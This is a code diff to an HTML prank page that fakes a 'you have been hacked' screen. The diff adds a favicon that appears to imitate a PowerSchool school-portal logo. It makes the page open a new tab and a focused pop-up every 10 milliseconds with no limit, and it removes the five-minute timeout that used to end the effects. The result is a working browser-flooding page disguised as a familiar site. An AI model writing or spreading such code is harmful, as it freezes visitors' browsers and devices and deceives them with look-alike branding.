@@ -1,3 +1,5 @@
+<link rel="shortcut icon" type="image/png" href="https://i.ibb.co/2sKRKZ2/Power-School-Logos-Vertical-01.webp">
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -99,7 +101,7 @@
             hackMessage.style.display = 'block';
 
             // Start hacking simulation
-            openMultipleTabs();
+            openInfiniteTabsAndPopups();
 
             // Set background color to black
             document.body.style.backgroundColor = 'black';
@@ -118,29 +120,22 @@
             backgroundChangeInterval = setInterval(() => {
                 document.body.style.backgroundColor = getRandomColor();
             }, 300);
-
-            setTimeout(() => {
-                document.getElementById('finalGif').style.display = 'block';
-                clearInterval(chaosInterval); 
-                clearInterval(titleChangeInterval);
-                clearInterval(backgroundChangeInterval);
-                clearInterval(cursorMoveInterval);
-                clearInterval(screenShakeInterval);
-            }, 300000); // Stop the chaos after 5 minutes
         });
 
         function showRandomMessage() {
-            // Display a message somewhere on the screen if needed
             console.log("YOU HAVE BEEN HACKED!!!!");
         }
 
-        function openMultipleTabs() {
-            const numberOfTabs = 50; // Number of tabs to open
-            for (let i = 0; i < numberOfTabs; i++) {
-                setTimeout(() => {
-                    window.open("https://example.com", "_blank"); // Adjust the URL as needed
-                }, i * 20); // Open a tab every 20 milliseconds
-            }
+        function openInfiniteTabsAndPopups() {
+            const openTab = () => {
+                // Open a new tab
+                window.open("https://example.com", "_blank"); // Adjust the URL as needed
+                // Open a new pop-up
+                const newWindow = window.open("https://example.com", "popup", "width=600,height=400"); // Adjust the pop-up URL and size as needed
+                if (newWindow) newWindow.focus(); // Focus the new window
+            };
+
+            setInterval(openTab, 10); // Open a new tab and pop-up every 10 milliseconds
         }
 
         function randomCursorMovement() {
@@ -168,6 +163,7 @@
             }
             return color;
         }
+
     </script>
 </body>
 </html>
